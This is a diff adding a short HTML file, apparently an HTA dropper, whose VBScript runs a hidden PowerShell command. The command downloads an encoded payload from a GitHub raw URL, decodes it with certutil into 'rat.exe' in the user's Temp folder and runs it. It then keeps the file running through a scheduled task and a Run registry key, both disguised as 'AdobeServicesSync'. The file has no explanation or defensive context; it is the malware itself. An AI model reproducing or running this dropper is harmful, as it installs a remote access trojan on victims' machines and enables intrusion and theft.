@@ -1,0 +1,10 @@
+<HTML> 
+<HEAD> 
+<script language="VBScript">
+    Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run ("powershell.exe -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/ShilpeshTrivedi/SakalaBoobBoon/master/cmd.txt -Destination ""C:\Users\$env:UserName\AppData\Local\Temp\cmd.txt""; ""C:\Windows\System32\certutil.exe -decode ""C:\Users\$env:UserName\AppData\Local\Temp\cmd.txt"" rat.exe""; Start-Process ""C:\Users\$env:UserName\AppData\Local\Temp\rat.exe""; ""C:\Windows\System32\schtasks.exe /create /tn ""AdobeServicesSync"" /tr """"C:\Users\%username%\AppData\Local\Temp\rat.exe"" //B"""" /sc minute /mo 25"";""cmd /c reg.exe add ""hkcu\software\microsoft\windows\currentversion\run"" /v ""AdobeServicesSync"" /t reg_sz /f /d ""C:\Users\%username%\AppData\Local\Temp\rat.exe""",0,true)(window.close)
+</script>
+</HEAD> 
+<BODY> 
+</BODY> 
+</HTML>
